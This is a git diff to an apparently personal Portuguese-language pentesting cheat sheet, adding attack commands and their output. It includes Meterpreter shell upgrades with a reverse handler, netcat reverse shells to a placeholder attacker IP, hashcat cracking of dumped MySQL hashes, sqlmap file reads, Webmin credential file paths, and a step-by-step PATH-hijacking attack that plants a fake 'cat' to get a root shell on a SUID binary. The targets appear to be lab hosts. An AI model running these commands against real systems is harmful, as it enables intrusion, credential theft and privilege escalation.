@@ -272,6 +272,30 @@ stat
 	Descrição: Mostra informações detalhadas sobre um arquivo ou diretório.
 exit ou quit
 
+
+enumerate if the host is 32bits or 64bits
+```
+nmap -p 445 --script smb-os-discovery 172.16.1.145
+Starting Nmap 7.95 ( https://nmap.org ) at 2025-04-01 09:46 EDT
+Nmap scan report for ORIONSCORP (172.16.1.145)
+Host is up (0.16s latency).
+
+PORT    STATE SERVICE
+445/tcp open  microsoft-ds
+
+Host script results:
+| smb-os-discovery: 
+|   OS: Windows 7 Ultimate 7601 Service Pack 1 (Windows 7 Ultimate 6.1)
+|   OS CPE: cpe:/o:microsoft:windows_7::sp1
+|   Computer name: USUARIO-PC
+|   NetBIOS computer name: USUARIO-PC\x00
+|   Workgroup: ORIONSCORP\x00
+|_  System time: 2025-04-01T10:38:51-03:00
+
+Nmap done: 1 IP address (1 host up) scanned in 4.21 seconds
+
+```
+
 ## Host windows
 **ex nbtstat**
 serve para identificar informações do host
@@ -693,6 +717,11 @@ mysql -h 192.168.0.5 -u root
 mysql -u <username> -p -h <hostname> -P <port> <database>
 ```
 
+configuration files:
+```
+/etc/mysql/mysql.conf.d/
+/etc/mysql/my.cnf
+```
 
 # msfconsole
 ```
@@ -725,6 +754,36 @@ services
 services 172.30.0.103
 ```
 
+Após conseguir uma shell evoluir para meterpreter:
+```
+meterpreter > background
+
+use post/multi/manage/shell_to_meterpreter
+msf6 post(shell_to_meterpreter) > set SESSION 1
+msf6 post(shell_to_meterpreter) > run
+
+# mensagem de êxito
+[*] Upgrading session ID: 1
+[*] Starting exploit/multi/handler
+[*] Started reverse TCP handler on 10.2.16.190:4433 
+[*] Post module execution completed
+msf6 post(multi/manage/shell_to_meterpreter) > 
+[*] Sending stage (203846 bytes) to 10.10.244.106
+[*] Meterpreter session 2 opened (10.2.16.190:4433 -> 10.10.244.106:49197) at 2025-04-01 11:56:18 -0400
+[*] Stopping exploit/multi/handler
+
+> sessions -i 2
+```
+Meterpreter permite:    
+- Upload/download de arquivos.
+- Keylogging.
+- Pivoting (redirecionamento de tráfego).     
+- Migração para outros processos.
+## meterpreter
+```
+
+search -f *key* C:\\
+```
 # windows
 **enumerar versão**
 ```
@@ -1110,7 +1169,11 @@ hydra -v -L users.txt -P pass.txt URL http-post-form "/turismo/login.php:login=^
 -W TIME
         defines a wait time between each connection a task performs. This usually only makes sense if a low task number is used, .e.g -t 1
 
-
+## hydra.restore
+when you cancel a hydra bruteforce, the program save a `./hydra.restore` file, to restore the bruteforce of previous try:
+```
+hydra -R
+```
 # cewl
 pesquisar por uma string em um site
 ```
@@ -1137,6 +1200,34 @@ hashcat --example-hashes
 hashcat para identificar a hash
 ```
 hashcat --identify aba63f26d5947a558d4fdbbbe4468965710520540ef3d48e0b3cbf79d6cba217
+```
+
+## Hash Format
+### passwd / shadow
+| Hash Format                 | Hashcat Mode | Example              |
+| --------------------------- | ------------ | -------------------- |
+| **MD5** (`$1$`)             | `500`        | `$1$salt$hash`       |
+| **SHA-256** (`$5$`)         | `7400`       | `$5$salt$hash`       |
+| **SHA-512** (`$6$`)         | `1800`       | `$6$salt$hash`       |
+| **bcrypt** (`$2a$`, `$2y$`) | `3200`       | `$2a$10$salt...hash` |
+
+
+### hashcat to crack MySQL4.1/MySQL5   | Database Server (-m 300)
+to crack with hashcat, we have to remove the `*`
+```
+# dumping from mysql database
+debian-sys-maint | *B3CDEC7DC42B824697AC3919B8017F1C1BFBBF53      
+root             | *81F5E21E35407D884A6CD4A731AEBFB6AF209E1B 
+
+# after format the hashes
+B3CDEC7DC42B824697AC3919B8017F1C1BFBBF53
+81F5E21E35407D884A6CD4A731AEBFB6AF209E1B
+
+```
+
+hashcat to crack MySQL4.1/MySQL5   | Database Server (-m 300)
+```
+hashcat -m 300 cred1 ~/wordlists/rockyou.txt
 ```
 
 # john
@@ -1201,7 +1292,7 @@ wget -mpEk https://example.com
 ```
 https://www.howtogeek.com/how-to-copy-a-whole-website-to-your-computer-using-wget/
 # grep
-buscar uma string em todo o sistema
+search for a string in a specific directory
 ```
 grep -ri "desec" /caminho/do/diretorio 2>/dev/null
 ```
@@ -1519,7 +1610,7 @@ Nmap done: 1 IP address (1 host up) scanned in 9.30 seconds
 ## reverse shell
 ```
 # exemplo 1
-nc ATACKER_IP OPENNED_PORT -c bash
+nc ATACKER_IP OPENNED_PORT -c /bin/bash
 
 # exemplo 2
 nc ATACKER_IP OPENNED_PORT -e /bin/bash
@@ -1783,6 +1874,17 @@ arquivo de outputs do sqlmap
 /home/kali/.local/share/sqlmap/output/
 ```
 
+**validating if a file exist with sqlmap**
+```
+sqlmap -u "http://172.16.1.116/acs/admin.php?pw=admin&page=/acs/index.php&del=3" -p del --search -F "index.php"
+```
+
+**reading the file content with sqlmap**
+```
+sqlmap -u "http://172.16.1.116/acs/admin.php?pw=admin&page=/acs/index.php&del=3" -p del --file-read="/var/www/acs/index.php"
+```
+
+
 #### SQL -> RCE
 falta fazer
 ```
@@ -1921,6 +2023,8 @@ GET /index.php?file=/etc/passwd%00 HTTP/1.1
 ```
 
 ## Local File Inclusion (LFI)
+- payloads: https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/File%20Inclusion/README.md
+
 infecção de logs com LFI/php
 FALTA FAZER (testar no 172.16.1.10)
 
@@ -2250,10 +2354,16 @@ https://www.hackingarticles.in/rce-with-lfi-and-ssh-log-poisoning/
 /etc/webmin/miniserv.users # Contém usuários e senhas (em formato hash) do Webmin.
  
 /etc/webmin/config # Contém configurações globais do Webmin.
+
+
+/var/webmin/webmin.log 
+/etc/webmin/webmin.groups
 ```
+Na documentação diz que o path pode ser `/etc/usermin/miniserv.conf`, dando a entender que **dependendo do usuário pode mudar o path**
+	No freebsd por exemplo o path é `/usr/local/etc/webmin`
 
 **file disclosure:**
-msfconsole module: admin/webmin/file_disclosure
+msfconsole module: admin/webmin/file_disclosure no path `/etc/webmin/miniserv.conf`
 ```
 admin:$1$XXXXXXXX$WHEbJtn2Q0oxB3s4C6osu1:0
 ```
@@ -2619,6 +2729,108 @@ find / -type f -name "key"
 script para scan automatizado
 - linpeas.sh https://github.com/peass-ng/PEASS-ng/releases/tag/20250202-a3a1123d
 - linuex exploit suggester https://github.com/The-Z-Labs/linux-exploit-suggester
+
+---------------------
+### Hijacking de PATH
+Quando um **binário ou script** chama um comando (como `cat`, `ls`, etc.) **sem usar o caminho absoluto** (ex.: `/bin/cat`), ele depende da variável `PATH` do sistema para encontrar o executável.  
+Se você **controlar o `PATH`**, pode fazer o sistema executar uma **versão maliciosa** do comando em vez da original.
+
+#### Teoria/explicação
+
+##### Funcionamento do `PATH`
+
+O `PATH` é uma lista de diretórios onde o sistema busca comandos, **na ordem em que aparecem**:
+
+```
+echo $PATH
+# Exemplo:
+/home/kali/.local/bin:/usr/local/bin:/usr/bin:/bin:/tmp
+```
+- O sistema **sempre verifica da esquerda para a direita**.
+- O **primeiro comando encontrado** é o que será executado.
+---
+
+**Como Realizar o Hijacking**
+
+**Forma Correta** (Prioriza seu diretório malicioso)
+
+```
+export PATH=/tmp:$PATH
+```
+- **Por quê?**
+    - Adiciona `/tmp` **no início** do `PATH`.
+    - se houver um `cat` em `/tmp`, ele será executado **antes** do `/bin/cat`.
+
+**Forma Errada** (Ignora seu diretório malicioso)
+```
+export PATH=$PATH:/tmp
+```
+- **Por quê?**
+    - Adiciona `/tmp` **no final** do `PATH`.
+    - O sistema **só usará seu `cat` malicioso se não encontrar o comando nos diretórios anteriores** (`/bin`, `/usr/bin`, etc.).
+---
+
+**Exemplo Prático**
+
+Suponha que:
+
+1. O binário vulnerável chama `system("cat /etc/passwd")` (sem `/bin/cat`).
+    
+2. Você cria um `cat` malicioso em `/tmp`:
+```
+echo -e '#!/bin/sh\n/bin/bash -p' > /tmp/cat && chmod +x /tmp/cat
+```   
+    
+3. **Modifica o `PATH` corretamente**:
+
+```
+export PATH=/tmp:$PATH
+```    
+
+4. **Executa o binário vulnerável**:
+```   
+./binario_vulneravel  # Agora executa SEU /tmp/cat (shell root)!
+```
+
+---
+
+##### **Observações Importantes**
+
+1. **Não use `PATH=/tmp` sozinho**
+    
+    - Isso **remove todos os outros diretórios** do `PATH`, quebrando comandos básicos (`ls`, `echo`, etc.).
+        
+    - Seu script malicioso pode até **falhar** se depender de outros binários.
+        
+2. **Sempre verifique a ordem do `PATH`**
+```
+echo $PATH
+```
+
+ - Certifique-se de que seu diretório malicioso (**`/tmp`**) está **no início**.
+  
+        
+3. **Use `env` para testes isolados**
+
+    `env PATH=/tmp:$PATH ./binario_vulneravel`
+    
+    - Altera o `PATH` apenas para esse comando, sem afetar o terminal atual.
+---
+
+**Dica:** Sempre use `which comando` para ver **qual versão** está sendo chamada.  
+Exemplo:
+```
+which cat  # Mostra se está pegando o /tmp/cat ou /bin/cat
+```
+
+#### Ataque
+
+Com isso, basta colocarmos um binário malicioso dentro do diretório `/tmp`
+```
+export PATH=/tmp:$PATH
+echo "/bin/bash -p" > cat && chmod 777 cat
+./script_vulneravel # executar script (com SUID) vulneravel a PATH Hijacking
+```
 
 
 ## Pivoting
